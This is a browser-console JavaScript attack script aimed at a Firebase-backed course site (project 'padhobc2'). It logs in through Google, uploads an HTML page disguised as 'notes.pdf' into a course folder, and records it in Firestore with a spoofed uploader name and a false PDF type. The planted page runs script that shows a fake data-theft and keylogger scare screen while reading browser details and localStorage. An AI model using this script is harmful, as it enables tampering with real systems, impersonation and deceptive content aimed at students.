(async () => {
    console.clear();

    const { getStorage, ref, uploadString, getDownloadURL } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js");
    const { getFirestore, collection, query, where, getDocs, updateDoc, arrayUnion } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js");
    const { getAuth, GoogleAuthProvider, signInWithPopup } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js");
    const { initializeApp } = await import("https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js");

    const config = {
        apiKey: "AIzaSyCnlyqpwhrCBiJuwPOQrBL4s7c8NLJWZEU",
        authDomain: "padhobc2.firebaseapp.com",
        projectId: "padhobc2",
        storageBucket: "padhobc2.firebasestorage.app",
        messagingSenderId: "602338597088",
        appId: "1:602338597088:web:f178db5b6bb777bfac9885"
    };

    const app = initializeApp(config, "ThreatSim_" + Date.now());
    const storage = getStorage(app);
    const db = getFirestore(app);
    const auth = getAuth(app);

    let user;
    try {
        const provider = new GoogleAuthProvider();
        const result = await signInWithPopup(auth, provider);
        user = result.user;
    } catch (e) {
        return;
    }

    const payload = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>System Diagnostic</title>
    <style>
        :root { --bg: #0d1117; --text: #c9d1d9; --red: #ff7b72; --green: #3fb950; --blue: #58a6ff; --border: #30363d; }
        body { margin: 0; background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; padding: 20px; overflow: hidden; }
        .container { max-width: 800px; margin: 0 auto; border: 1px solid var(--border); border-radius: 6px; background: #161b22; box-shadow: 0 0 50px rgba(0,0,0,0.5); }
        .header { background: #21262d; padding: 10px 15px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
        .blink { animation: blinker 1s linear infinite; color: var(--red); font-weight: bold; }
        @keyframes blinker { 50% { opacity: 0; } }
        
        .content { padding: 20px; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 20px; }
        .panel { border: 1px solid var(--border); padding: 10px; border-radius: 4px; background: #0d1117; }
        .panel h3 { margin: 0 0 10px; border-bottom: 1px solid var(--border); padding-bottom: 5px; font-size: 14px; color: var(--blue); }
        
        .log-window { height: 200px; overflow-y: auto; border: 1px solid var(--border); background: black; padding: 10px; font-size: 12px; color: var(--green); }
        .log-entry { margin-bottom: 4px; }
        .log-warn { color: #d29922; }
        .log-crit { color: var(--red); }

        .progress-container { margin-top: 20px; }
        .progress-bar { height: 20px; background: #30363d; border-radius: 10px; overflow: hidden; position: relative; }
        .progress-fill { height: 100%; background: var(--red); width: 0%; transition: width 0.2s; }
        .status-text { margin-top: 5px; font-size: 12px; text-align: right; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span>Your System is Vulnerable!</span>
            <span class="blink">UNSANDBOXED SCRIPT EXECUTION</span>
        </div>
        <div class="content">
            <div style="margin-bottom: 15px; border-left: 4px solid var(--red); padding-left: 10px;">
                <h2 style="margin:0; color: white;">Extracting all sensitive data and passwords on the system</h2>
                <p style="margin:5px 0 0; font-size: 12px;">Your system is under attack!</p>
            </div>

            <div class="grid">
                <div class="panel">
                    <h3>TARGET RECONNAISSANCE</h3>
                    <div id="recon">Scanning...</div>
                </div>
                <div class="panel">
                    <h3>SESSION DATA</h3>
                    <div id="session">Extracting Storage...</div>
                </div>
            </div>

            <div class="panel">
                <h3>EXPLOIT EXECUTION LOG</h3>
                <div class="log-window" id="logs"></div>
            </div>

            <div class="progress-container">
                <div style="font-size: 12px; margin-bottom: 5px;">Exfiltrating Data to C2 Server (192.168.1.1)...</div>
                <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
                <div class="status-text" id="status">Connecting...</div>
            </div>
        </div>
    </div>

    <script>
        const logs = document.getElementById('logs');
        const fill = document.getElementById('fill');
        const status = document.getElementById('status');

        function log(msg, type = '') {
            const div = document.createElement('div');
            div.className = 'log-entry ' + type;
            div.innerText = \`[\${new Date().toLocaleTimeString()}] \${msg}\`;
            logs.appendChild(div);
            logs.scrollTop = logs.scrollHeight;
        }

        const reconData = \`
            OS: \${navigator.platform}<br>
            Cores: \${navigator.hardwareConcurrency || 'Unknown'}<br>
            Res: \${window.screen.width}x\${window.screen.height}<br>
            Agent: \${navigator.userAgent.substring(0, 30)}...
        \`;
        document.getElementById('recon').innerHTML = reconData;

        setTimeout(() => {
            const fakeToken = "eyJhGciOiJIUzI1NiIsInR5cCI...";
            document.getElementById('session').innerHTML = \`
                <span style="color:var(--red)">AUTH TOKEN FOUND:</span><br>
                \${fakeToken.substring(0, 20)}...<br><br>
                LocalStorage Keys: \${localStorage.length}
            \`;
            log("Accessing window.localStorage...", "log-warn");
            log("Found authentication tokens.");
        }, 1000);

        const steps = [
            { t: 500, m: "Initializing BeEF hooks..." },
            { t: 1200, m: "Bypassing CSP (Content Security Policy)...", c: "log-crit" },
            { t: 2000, m: "Scanning internal network (192.168.0.0/24)..." },
            { t: 2800, m: "Port 80 Open on Gateway." },
            { t: 3500, m: "Injecting Keylogger..." },
            { t: 4500, m: "Capturing Screenshot..." },
            { t: 5500, m: "Data package compressed (2.4MB)." }
        ];

        steps.forEach(s => {
            setTimeout(() => log(s.m, s.c), s.t);
        });

        let width = 0;
        const interval = setInterval(() => {
            if (width >= 100) {
                clearInterval(interval);
                status.innerText = "UPLOAD COMPLETE";
                status.style.color = "var(--red)";
                log("Session hijacked successfully.", "log-crit");
            } else {
                width++;
                fill.style.width = width + '%';
                status.innerText = \`Uploading... \${width}%\`;
            }
        }, 60);
    </script>
</body>
</html>`;

    const fileName = "notes.pdf";
    const courseId = "Dlse1L0C66oRyST4GcDJ"; 
    const folderName = "hu";

    try {
        const storageRef = ref(storage, `courses/${courseId}/${folderName}/${fileName}`);
        
        const uploadTask = await uploadString(storageRef, payload, 'raw', { contentType: 'text/html' });
        const downloadUrl = await getDownloadURL(uploadTask.ref);

        
        const q = query(
            collection(db, "folders"), 
            where("courseId", "==", courseId),
            where("name", "==", folderName)
        );
        
        const querySnapshot = await getDocs(q);

        if (querySnapshot.empty) {
            return;
        }

        const folderDoc = querySnapshot.docs[0];
        
        const fileEntry = {
            name: fileName,
            url: downloadUrl,
            createdAt: new Date().toISOString(),
            uploadedBy: "RAJ SHUKLA", 
            type: "application/pdf"
        };

        await updateDoc(folderDoc.ref, {
            files: arrayUnion(fileEntry)
        });

    } catch (e) {
        return;
    }
})();